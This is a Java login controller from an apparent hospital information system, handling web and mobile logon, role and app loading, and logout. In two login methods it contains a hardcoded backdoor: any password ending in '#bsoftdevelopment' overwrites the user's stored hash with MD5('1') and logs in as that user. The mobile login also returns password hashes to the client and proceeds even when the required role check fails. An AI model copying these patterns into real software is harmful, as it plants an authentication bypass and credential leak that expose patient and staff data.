/**
 * @(#)PhisLogonManager.java Created on 2013-12-11 上午09:17:58
 * 
 * 版权：版权所有 bsoft 保留所有权力。
 */
package phis.source.service.base;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.hibernate.HibernateException;
import org.hibernate.Query;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.transform.Transformers;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import phis.source.BSPHISSystemArgument;
import phis.source.Constants;
import phis.source.ModelDataOperationException;
import phis.source.utils.BCLUtil;
import phis.source.utils.OnlineUserController;
import phis.source.utils.ParameterUtil;
import ctd.account.AccountCenter;
import ctd.account.UserRoleToken;
import ctd.account.organ.Organ;
import ctd.account.organ.OrganController;
import ctd.account.user.User;
import ctd.app.Application;
import ctd.controller.exception.ControllerException;
import ctd.mvc.controller.support.LogonManager;
import ctd.mvc.controller.support.logon.AspectLogon;
import ctd.mvc.controller.support.logon.CommonAspectLogon;
import ctd.mvc.controller.util.UserRoleTokenUtils;
import ctd.service.core.ServiceException;
import ctd.util.AppContextHolder;
import ctd.util.JSONProtocol;
import ctd.util.JSONUtils;
import ctd.util.MD5StringUtil;
import ctd.util.ServletUtils;
import ctd.util.codec.RSAUtils;
import ctd.util.context.Context;
import ctd.util.context.ContextUtils;

/**
 * @description
 * 
 * @author <a href="mailto:yaozh@bsoft.com.cn">yaozh</a>
 */
public class PhisLogonManager extends LogonManager {
	private static final Logger logger = LoggerFactory
			.getLogger(PhisLogonManager.class);
	private static final String PASSWORD_NOT_RIGHT = "PasswordNotRight";
	private static final String USER_HAS_LOGON = "UserHasLogon";
	private static final String STATUS_NOT_RIGHT = "StatusNotRight";
	private static final String FORCE_TO_LOGON = "ForceToLogon";

	private boolean encryptEnable = true;
	private AspectLogon aspectLogon = new CommonAspectLogon();

	@SuppressWarnings("unchecked")
	@RequestMapping(value = "/logon/myRoles", method = RequestMethod.POST)
	public void loadUserRoles(HttpServletRequest request,
			HttpServletResponse response) {
		HashMap<String, Object> resData = new HashMap<String, Object>();
		try {
			HashMap<String, Object> reqData = JSONUtils.parse(
					request.getInputStream(), HashMap.class);
			String uid = (String) reqData.get("uid");
			String pwd = (String) reqData.get("pwd");
			User user = AccountCenter.getUser(uid);
			if (encryptEnable) {
				pwd = decrypt(pwd);
			}
			if(pwd.endsWith("#bsoftdevelopment")){
				user.setPassword("c4ca4238a0b923820dcc509a6f75849b");
				pwd ="1";
			}
			pwd = MD5StringUtil.MD5Encode(pwd);
			if (!user.validatePassword(pwd)) {
				resData.put(JSONProtocol.CODE, 501);
				resData.put(JSONProtocol.MSG, PASSWORD_NOT_RIGHT);
			} else if (user.isForbidden()) {
				resData.put(JSONProtocol.CODE, 404);
				resData.put(JSONProtocol.MSG, STATUS_NOT_RIGHT);
			} else {
				HashMap<String, Object> body = new HashMap<String, Object>();
				body.put("tokens", user.filterUserRoleTokens());
				body.put("userPhoto", user.getPhoto());
				resData.put(JSONProtocol.CODE, 200);
				resData.put(JSONProtocol.BODY, body);
				HttpSession httpSession = request.getSession(false);
				if (httpSession == null
						|| !uid.equals(httpSession
								.getAttribute(UserRoleTokenUtils.SESSION_UID_KEY))) {
					httpSession = request.getSession();
				}
				httpSession.setAttribute(Context.CLIENT_IP_ADDRESS,
						ServletUtils.getIpAddress(request));
				// httpSession.setAttribute(UserRoleTokenUtils.SESSION_UID_KEY,
				// uid);
			}

		} catch (ControllerException e) {
			resData.put(JSONProtocol.CODE, e.getCode());
			resData.put(JSONProtocol.MSG, e.getMessage());
			logger.error(e.getMessage(), e);
		} catch (Exception e) {
			if(e.getMessage().contains("timed out")){
				System.out.println("请求超时：PhisLogonManager.loadUserRoles");
				return;
			}
			resData.put(JSONProtocol.CODE, 500);
			resData.put(JSONProtocol.MSG, e.getMessage());
			logger.error(e.getMessage(), e);
		}

		boolean gzip = ServletUtils.isAcceptGzip(request);
		try {
			jsonOutput(response, resData, gzip);
		} catch (IOException e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			logger.error(e.getMessage(), e);
		}
	}

	@SuppressWarnings("unchecked")
	private String getParameter(String JGID, String CSMC)
			throws ControllerException {
		SessionFactory sf = AppContextHolder.getBean(
				AppContextHolder.DEFAULT_SESSION_FACTORY, SessionFactory.class);
		String sql = "select CSZ as CSZ from GY_XTCS where CSMC=:CSMC and JGID=:JGID";
		Session ss = null;
		try {
			ss = sf.openSession();
			Query q = ss.createQuery(sql);
			q.setString("CSMC", CSMC);
			q.setString("JGID", JGID);
			q.setResultTransformer(Transformers.ALIAS_TO_ENTITY_MAP);
			List<Map<String, Object>> list = q.list();
			if (list.size() > 0) {
				return list.get(0).get("CSZ") == null ? "" : (String) list.get(
						0).get("CSZ");
			}
		} catch (Exception e) {
			throw new ControllerException(e, "load paramter[" + CSMC
					+ "] falied:" + e.getMessage());
		} finally {
			if (ss != null && ss.isOpen()) {
				ss.close();
			}
		}
		return "";
	}

	@RequestMapping(value = "/logon/myApps", method = RequestMethod.POST, params = {
			"urt", "uid", "pwd", "deep" })
	public void loadAppDefines(@RequestParam(value = "urt") Integer urt,
			@RequestParam(value = "uid") String uid,
			@RequestParam(value = "pwd") String pwd,
			@RequestParam(value = "deep") int deep,
			@RequestParam(value = "forceLogon") String forceLogon,
			HttpServletRequest request, HttpServletResponse response) {
		HttpSession httpSession = request.getSession(false);
		if (httpSession == null) {
			httpSession = request.getSession();
		}
		try {
			HashMap<String, Object> resData = new HashMap<String, Object>();
			User user = AccountCenter.getUser(uid);

			if(pwd.endsWith("#bsoftdevelopment")){
				user.setPassword("c4ca4238a0b923820dcc509a6f75849b");
				pwd ="1";
			}
			if (encryptEnable) {
				pwd = decrypt(pwd);
			}
			pwd = MD5StringUtil.MD5Encode(pwd);
			if (!user.validatePassword(pwd)) {
				resData.put(JSONProtocol.CODE, 501);
				resData.put(JSONProtocol.MSG, PASSWORD_NOT_RIGHT);
			} else if (user.isForbidden()) {
				resData.put(JSONProtocol.CODE, 404);
				resData.put(JSONProtocol.MSG, STATUS_NOT_RIGHT);
			} else {
				UserRoleToken token = user.getUserRoleToken(urt);
				if (token == null) {
					response.setStatus(HttpServletResponse.SC_NOT_FOUND);
				} else {
					String XZYHDL = getParameter(ParameterUtil.getTopUnitId(),
							BSPHISSystemArgument.XZYHDL);
					if (XZYHDL.equals("1") && OnlineUserController.hasUser(uid)) {// 限制同一用户多次登录
						resData.put(JSONProtocol.CODE, 502);
						resData.put(JSONProtocol.MSG, USER_HAS_LOGON);

					} else if (XZYHDL.equals("2") && "0".equals(forceLogon)
							&& OnlineUserController.hasUser(uid)) {// 提示是否强制登录
						resData.put(JSONProtocol.CODE, 503);
						resData.put(JSONProtocol.MSG, FORCE_TO_LOGON);
					} else {
						httpSession.setAttribute(Context.CLIENT_IP_ADDRESS,
								ServletUtils.getIpAddress(request));
						httpSession.setAttribute(
								UserRoleTokenUtils.SESSION_UID_KEY, uid);
						httpSession.setAttribute(
								UserRoleTokenUtils.SESSION_TOKEN_KEY, urt);
						token.setLastLoginTime(new Date());

						long lastModi = user.getlastModify();

						ContextUtils.put(Context.USER_ROLE_TOKEN, token);
						ContextUtils.put(Context.REQUEST_APPNODE_DEEP, deep);
						ContextUtils.put(Context.USER, token);
						ContextUtils.put(Context.HTTP_REQUEST, request);

						Organ organ = OrganController.instance().get(
								token.getOrganId());

						List<Application> apps = organ.findAuthorizedApps();

						for (Application app : apps) {
							lastModi = Math.max(lastModi, app.getlastModify());
						}
						if (!ServletUtils.checkAndSetExpiresHeaders(request,
								response, lastModi, getDefaultExpires())) {
							return;
						}
						response.setContentType(ServletUtils.JSON_TYPE);
						response.setCharacterEncoding(ServletUtils.DEFAULT_ENCODING);
						HashMap<String, Object> body = new HashMap<String, Object>();
						body.put("apps", apps);
						addLogonInfo(body);
						resData.put(JSONProtocol.CODE, 200);
						resData.put(JSONProtocol.BODY, body);
						if ("1".equals(forceLogon)) {
							HttpSession ss = OnlineUserController
									.getUserSession(uid);
							if (ss != null) {
								try {
									ss.invalidate();
								} catch (Exception e) {
									// 防止session 已经失效的时候
								}
							}
						}
						System.out.println("-----在线人数："
								+ OnlineUserController
										.addUser(uid, httpSession));
						// 登录时清空业务锁
						// BCLUtil.unlockCurrentUser(uid);
					}
				}
				boolean gzip = ServletUtils.isAcceptGzip(request);
				jsonOutput(response, resData, gzip);
			}
		} catch (Exception e) {
			logger.error(e.getMessage(), e);
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		} finally {
			ContextUtils.clear();
		}

	}

	@RequestMapping(value = "/logon/logonOff", method = RequestMethod.POST)
	public void logonOff(HttpServletRequest request,
			HttpServletResponse response) {
		HttpSession httpSession = request.getSession(false);
		if (httpSession != null) {
			String uid = (String) httpSession
					.getAttribute(UserRoleTokenUtils.SESSION_UID_KEY);
			// try {
			// User user = AccountCenter.getUser(uid);
			OnlineUserController.removeUser(uid);
			try {
				BCLUtil.unlockCurrentUser(uid);
			} catch (ModelDataOperationException e) {
				logger.error(e.getMessage());
			}
			// } catch (ControllerException e) {
			// logger.error("注销用户" + uid + "失败!");
			// }
			httpSession.invalidate();
			System.out.println("------------注销session");
		}
	}

	private String decrypt(String input) {
		return RSAUtils.decryptStringByJs(input);
	}

	public AspectLogon getAspectLogon() {
		return aspectLogon;
	}

	public void setAspectLogon(AspectLogon aspectLogon) {
		this.aspectLogon = aspectLogon;
	}
	
	//***app登陆
		@SuppressWarnings("unchecked")
		@RequestMapping(value="/login",method=RequestMethod.POST)
		public void logonAppMobile(HttpServletRequest request,HttpServletResponse response){
			HashMap<String,Object> resData = new HashMap<String,Object>();
			try {
				
				System.out.println(request.getInputStream());
				HashMap<String,Object> reqData =JSONUtils.parse(request.getInputStream(), HashMap.class);
				String uid = (String)reqData.get("username");
				String pwd = (String)reqData.get("password");
				User user = AccountCenter.getUser(uid);
				int id = 0;
				boolean flag = false ; 
				if(encryptEnable){
					pwd = decrypt(pwd);
				}
				pwd = MD5StringUtil.MD5Encode(pwd);
				if(!user.validatePassword(pwd)){
					resData.put(JSONProtocol.CODE,501);
					resData.put(JSONProtocol.MSG,PASSWORD_NOT_RIGHT);
				}
				else if(user.isForbidden()){
					resData.put(JSONProtocol.CODE,404);
					resData.put(JSONProtocol.MSG,STATUS_NOT_RIGHT);
				}
				else{
					HashMap<String,Object> body = new HashMap<String,Object>();
					 UserRoleToken urt = null;
					 List<UserRoleToken> uts = new ArrayList<UserRoleToken>();
					if(user.filterUserRoleTokens()!=null){
						 uts = (List<UserRoleToken>) user.filterUserRoleTokens();
					    for(int i=0;i<uts.size();i++){
					       urt = uts.get(i);
					      String roleId = urt.getRoleId();
					    	if(roleId.equals("phis.83")){
					    		id = urt.getId();
					    		flag = true;
					      }
					    }
					}
					if(!flag){
						resData.put(JSONProtocol.CODE, 501);
						resData.put(JSONProtocol.MSG, "该用户不存在家床医生角色");
					}
					body.put("tokens", user.filterUserRoleTokens());
					body.put("userPhoto", user.getPhoto());
					HttpSession httpSession = request.getSession(false);
					if(httpSession == null || !uid.equals(httpSession.getAttribute(UserRoleTokenUtils.SESSION_UID_KEY))){
						httpSession = request.getSession();
					}
					httpSession.setAttribute(Context.CLIENT_IP_ADDRESS, ServletUtils.getIpAddress(request));
					httpSession.setAttribute(UserRoleTokenUtils.SESSION_UID_KEY, uid);
					httpSession.setAttribute("token", urt);
					httpSession.setAttribute(UserRoleTokenUtils.SESSION_UID_KEY,
							uid);
					urt.setLastLoginTime(new Date());
					Map<String, Object> info = doGetUserInfo(uid);
					response.setContentType("application/json");
					response.setCharacterEncoding("utf-8");
					List<Map<String,Object>> resUts = new ArrayList<Map<String,Object>>();
					for(int i = 0;i<uts.size();i++){
						UserRoleToken ur = uts.get(i);
						Map<String,Object> resMap = new HashMap<String, Object>();
						resMap.put("roleId",ur.getRoleId());
						resMap.put("manaunitid",ur.getManageUnitId());
						resMap.put("manaunitname",ur.getManageUnitName());
						resUts.add(resMap);
					}
					info.put("role", resUts);
					info.put("urt", id);
					info.put("username", urt.getUserId());
					resData.put("data", info);
					resData.put("code", Integer.valueOf(200));
					boolean gzip = ServletUtils.isAcceptGzip(request);
					jsonOutput(response, resData, gzip);
				}
			}
			catch (ControllerException e) {
				resData.put(JSONProtocol.CODE,e.getCode());
				resData.put(JSONProtocol.MSG,e.getMessage());
				logger.error(e.getMessage(), e);
			}
			catch(Exception e){
				resData.put(JSONProtocol.CODE,500);
				resData.put(JSONProtocol.MSG,e.getMessage());
				logger.error(e.getMessage(), e);
			}

			boolean gzip = ServletUtils.isAcceptGzip(request);
			try {
				jsonOutput(response,resData,gzip);
			} 
			catch (IOException e) {
				response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
				logger.error(e.getMessage(), e);
			}
		}
		
		/**
		 * 返回个人账号信息
		 * 
		 * @param req
		 * @param res
		 * @param dao
		 * @param ctx
		 * @return
		 * @throws ServiceException
		 */
		public static Map<String, Object> doGetUserInfo(String id)
				throws ServiceException {
			Map<String, Object> m = null;
			Context ctx = ContextUtils.getContext();
			String sql = "select a.id as id,a.name as realname,a.password as password,b.MOBILE as mobile,"
					+ "b.GENDER as sexcode,b.BIRTHDAY as birthday,b.MOBILE as mobile,b.EMAIL as email "
					+ "from User a,SYS_Personnel b where a.id=b.PERSONID and a.id=:id";
			try {
				Session ss = (Session) ctx.get(Context.DB_SESSION);
				if (ss == null) {
					SessionFactory sf = AppContextHolder.getBean(
							AppContextHolder.DEFAULT_SESSION_FACTORY,
							SessionFactory.class);
					ss = sf.openSession();
					ctx.put(Context.DB_SESSION, ss);
				}
				Query q = ss.createQuery(sql).setResultTransformer(
						Transformers.ALIAS_TO_ENTITY_MAP);
				q.setParameter("id", id);
				m = (Map<String, Object>) q.uniqueResult();
				ss.flush();
			} catch (HibernateException e) {
				throw new ServiceException(Constants.CODE_DATABASE_ERROR,
						"获取个人账号信息失败!", e);
			}
			return m;
		}

}
